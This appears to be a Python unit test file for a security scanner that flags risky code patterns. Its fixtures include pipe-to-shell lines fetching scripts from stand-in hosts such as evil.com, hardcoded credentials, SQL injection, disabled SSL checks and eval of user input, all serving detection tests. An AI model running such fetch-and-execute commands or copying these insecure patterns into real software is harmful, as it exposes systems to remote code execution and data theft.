"""
Tests for Harmful Code Detector

This test suite validates the security threat detection system.
"""

import unittest
import os
import tempfile
import shutil
from pathlib import Path
import sys

# Add parent directory to path to import the module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from security.harmful_code_detector import HarmfulCodeDetector, ThreatPattern


class TestHarmfulCodeDetector(unittest.TestCase):
    """Test harmful code detection"""
    
    def setUp(self):
        """Create temporary directory for test files"""
        self.test_dir = tempfile.mkdtemp()
        self.detector = HarmfulCodeDetector()
    
    def tearDown(self):
        """Clean up temporary directory"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def create_test_file(self, filename, content):
        """Helper to create test files"""
        filepath = os.path.join(self.test_dir, filename)
        with open(filepath, 'w') as f:
            f.write(content)
        return filepath
    
    def test_detect_pipe_to_shell(self):
        """Test detection of curl | sh pattern"""
        filepath = self.create_test_file('test.sh', '''
            # Install something
            curl -fsSL https://example.com/install.sh | sh
        ''')
        
        result = self.detector.scan_file(filepath)
        
        self.assertTrue(len(result.threats) > 0)
        self.assertEqual(result.threats[0]['name'], 'pipe_to_shell')
        self.assertEqual(result.threats[0]['severity'], 'CRITICAL')
        self.assertTrue(result.approval_required)
    
    def test_detect_secrets_in_env(self):
        """Test detection of secrets in subprocess environment"""
        filepath = self.create_test_file('test.yml', '''
            env:
              SECRET_KEY: ${{ secrets.MY_SECRET }}
              API_KEY: ${{ secrets.API_KEY }}
        ''')
        
        result = self.detector.scan_file(filepath)
        
        secret_threats = [t for t in result.threats if t['name'] == 'secrets_in_subprocess_env']
        self.assertTrue(len(secret_threats) >= 2)
        self.assertEqual(secret_threats[0]['severity'], 'CRITICAL')
    
    def test_detect_unverified_import(self):
        """Test detection of unverified dynamic imports"""
        filepath = self.create_test_file('test.py', '''
            import importlib.util
            spec = importlib.util.spec_from_file_location('module', 'some/path.py')
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        ''')
        
        result = self.detector.scan_file(filepath)
        
        import_threats = [t for t in result.threats if t['name'] == 'unverified_dynamic_import']
        self.assertTrue(len(import_threats) >= 3)
        for threat in import_threats:
            self.assertEqual(threat['severity'], 'HIGH')
    
    def test_detect_hardcoded_credentials(self):
        """Test detection of hardcoded credentials"""
        filepath = self.create_test_file('test.py', '''
            # Bad practice - hardcoded credentials
            password = "MySecretPassword123"
            api_key = "sk_live_1234567890abcdef"
        ''')
        
        result = self.detector.scan_file(filepath)
        
        cred_threats = [t for t in result.threats if t['name'] == 'hardcoded_credentials']
        self.assertTrue(len(cred_threats) >= 2)
        self.assertEqual(cred_threats[0]['severity'], 'CRITICAL')
    
    def test_detect_unsafe_permissions(self):
        """Test detection of unsafe file permissions"""
        filepath = self.create_test_file('test.sh', '''
            # Very bad - world writable
            chmod 777 /tmp/important_file
            chmod 0o666 secret.key
        ''')
        
        result = self.detector.scan_file(filepath)
        
        perm_threats = [t for t in result.threats if t['name'] == 'unsafe_file_permissions']
        self.assertTrue(len(perm_threats) >= 2)
        self.assertEqual(perm_threats[0]['severity'], 'HIGH')
    
    def test_detect_sql_injection(self):
        """Test detection of SQL injection risks"""
        filepath = self.create_test_file('test.py', '''
            # Vulnerable to SQL injection
            cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
            cursor.execute("DELETE FROM items WHERE name = '%s'" % item_name)
        ''')
        
        result = self.detector.scan_file(filepath)
        
        sql_threats = [t for t in result.threats if t['name'] == 'sql_injection_risk']
        self.assertTrue(len(sql_threats) >= 1)
        self.assertEqual(sql_threats[0]['severity'], 'HIGH')
    
    def test_detect_disabled_ssl(self):
        """Test detection of disabled SSL verification"""
        filepath = self.create_test_file('test.py', '''
            import requests
            response = requests.get(url, verify=False)
            SSL_VERIFY = False
        ''')
        
        result = self.detector.scan_file(filepath)
        
        ssl_threats = [t for t in result.threats if t['name'] == 'disabled_ssl_verification']
        self.assertTrue(len(ssl_threats) >= 2)
        self.assertEqual(ssl_threats[0]['severity'], 'HIGH')
    
    def test_no_threats_in_safe_code(self):
        """Test that safe code doesn't trigger false positives"""
        filepath = self.create_test_file('safe.py', '''
            import os
            import json
            
            def process_data(data):
                """Process data safely - not recursive"""
                return data.upper()
            
            if __name__ == '__main__':
                result = process_data("hello")
                print(result)
        ''')
        
        result = self.detector.scan_file(filepath)
        
        # Should have no threats (or only low-severity false positives)
        critical_high_threats = [t for t in result.threats 
                                if t['severity'] in ['CRITICAL', 'HIGH']]
        self.assertEqual(len(critical_high_threats), 0)
        self.assertFalse(result.approval_required)
    
    def test_approval_required_logic(self):
        """Test that approval is required for critical/high threats"""
        # CRITICAL threat should require approval
        filepath1 = self.create_test_file('critical.sh', 'curl https://evil.com | sh')
        result1 = self.detector.scan_file(filepath1)
        self.assertTrue(result1.approval_required)
        
        # Multiple HIGH threats should require approval
        filepath2 = self.create_test_file('high.py', '''
            eval(user_input)
            exec(untrusted_code)
            os.system(f"rm {filename}")
        ''')
        result2 = self.detector.scan_file(filepath2)
        self.assertTrue(result2.approval_required)
    
    def test_danger_report_generation(self):
        """Test that danger reports are generated correctly"""
        filepath = self.create_test_file('dangerous.sh', 'curl http://bad.com | bash')
        result = self.detector.scan_file(filepath)
        
        self.assertTrue(result.approval_required)
        self.assertTrue(len(result.danger_report) > 0)
        self.assertIn('THREE-STAGE APPROVAL REQUIRED', result.danger_report)
        self.assertIn('CRITICAL', result.danger_report)
        self.assertIn('Impact:', result.danger_report)
        self.assertIn('Recommendation:', result.danger_report)
    
    def test_scan_directory(self):
        """Test scanning entire directory"""
        # Create multiple test files
        self.create_test_file('safe.py', 'print("hello")')
        self.create_test_file('unsafe.sh', 'curl http://x.com | sh')
        self.create_test_file('test.js', 'eval(userInput)')
        
        results = self.detector.scan_directory(self.test_dir)
        
        # Should find threats in unsafe files
        self.assertTrue(len(results) >= 2)
        
        # Should skip safe.py
        unsafe_files = [r.file_path for r in results]
        safe_file = os.path.join(self.test_dir, 'safe.py')
        self.assertNotIn(safe_file, unsafe_files)
    
    def test_summary_report_generation(self):
        """Test generation of summary report"""
        # Create files with threats
        self.create_test_file('bad1.sh', 'curl http://a.com | sh')
        self.create_test_file('bad2.py', 'password = "hardcoded123"')
        
        results = self.detector.scan_directory(self.test_dir)
        summary = self.detector.generate_summary_report(results)
        
        self.assertIn('HARMFUL CODE DETECTION SUMMARY', summary)
        self.assertIn('Files Scanned:', summary)
        self.assertIn('Total Threats Detected:', summary)
        self.assertIn('CRITICAL:', summary)


class TestThreatPatternDefinitions(unittest.TestCase):
    """Test that threat patterns are well-defined"""
    
    def test_all_patterns_have_required_fields(self):
        """Verify all threat patterns have required fields"""
        detector = HarmfulCodeDetector()
        
        for pattern in detector.THREAT_PATTERNS:
            self.assertTrue(hasattr(pattern, 'name'))
            self.assertTrue(hasattr(pattern, 'pattern'))
            self.assertTrue(hasattr(pattern, 'severity'))
            self.assertTrue(hasattr(pattern, 'description'))
            self.assertTrue(hasattr(pattern, 'impact'))
            self.assertTrue(hasattr(pattern, 'recommendation'))
            
            self.assertIn(pattern.severity, ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'])
    
    def test_pattern_uniqueness(self):
        """Verify pattern names are unique"""
        detector = HarmfulCodeDetector()
        names = [p.name for p in detector.THREAT_PATTERNS]
        
        self.assertEqual(len(names), len(set(names)), 
                        "Duplicate pattern names found")


if __name__ == '__main__':
    unittest.main()
